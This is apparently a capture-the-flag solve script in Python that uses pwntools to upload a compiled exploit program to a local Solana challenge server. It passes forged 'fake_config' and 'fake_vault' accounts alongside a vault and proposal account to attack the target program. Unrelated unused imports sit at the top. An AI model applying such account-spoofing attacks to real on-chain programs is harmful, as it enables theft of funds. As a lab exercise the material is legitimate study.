from hashlib import sha256
from typing import Any, List, Optional, Tuple, Union

from based58 import b58decode, b58encode
from nacl.signing import VerifyKey

from solana.utils import ed25519_base, helpers
from solana.publickey import PublicKey



# sample solve script to interface with the server
from pwn import *

# feel free to change this
account_metas = [
    ("program", "-"), # readonly
    ("user", "sw"), # signer + writable
    ("config", "w"),
    ("vault", "w"),
    ("fake_config", "w"),
    ("fake_vault", "w"),
    ("p4_addr", "w"),
    ("my_pr", "-"),
    ("sp", "-"),
]

instruction_data = b""
p = remote("0.0.0.0", 8080)

p.sendlineafter("pubkey:", "My11111111111111111111111111111111111111112")

with open("target/deploy/solve.so", "rb") as f:
    solve = f.read()

p.sendlineafter(b"program len: \n", str(len(solve)).encode())
p.send(solve)

accounts = {}

print("send")

p.recvuntil("some information for you:")

p.recvuntil("program: ")
accounts["program"] = p.recvuntil("\n").decode()[:-1]
p.recvuntil("user: ")
accounts["user"] = p.recvuntil("\n").decode()[:-1]


accounts["config"] = PublicKey.find_program_address([b"CONFIG"], PublicKey(accounts["program"]))[0]
accounts["vault"] = PublicKey.find_program_address([b"VAULT"], PublicKey(accounts["program"]))[0]
accounts["fake_config"] = PublicKey.find_my_program_address([b"CONFIG"], PublicKey(accounts["program"]))[0]
accounts["fake_vault"] = PublicKey.find_my_program_address([b"VAULT"], PublicKey(accounts["program"]))[0]
accounts["p4_addr"] = PublicKey.find_program_address([b"PROPOSAL", b"\x04"], PublicKey(accounts["program"]))[0]
accounts["my_pr"] = "My11111111111111111111111111111111111111112"
accounts["sp"] = "11111111111111111111111111111111"
print(accounts)

p.sendlineafter("accounts: ", str(len(account_metas)).encode())
for (name, perms) in account_metas:
    p.sendline(f"{perms} {accounts[name]}".encode())
print(p.sendlineafter(b"ix len: \n", str(len(instruction_data)).encode()))

p.interactive()